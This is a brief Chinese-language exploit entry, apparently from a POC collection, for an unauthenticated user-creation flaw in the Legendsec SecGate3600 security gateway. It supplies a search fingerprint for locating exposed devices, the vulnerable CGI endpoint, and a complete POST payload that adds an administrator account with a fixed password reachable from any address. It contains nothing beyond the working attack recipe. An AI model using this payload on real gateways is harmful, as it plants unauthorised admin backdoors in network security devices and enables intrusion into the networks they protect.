# 网神SecGate3600安全网关未授权添加用户漏洞

网神SecGate3600安全网关未授权添加用户 ｜ 未授权访问 ｜ —
- **指纹**：`body="sec_gate_image/login_02.gif"`
- **请求**：`POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1`

**Payload**
```
type=saveAdmin&id=2&userName=audit&pwd=audit@1234&net=0.0.0.0&mask=0.0.0.0&port=ANY
&allow=Y
```
- **响应特征**：200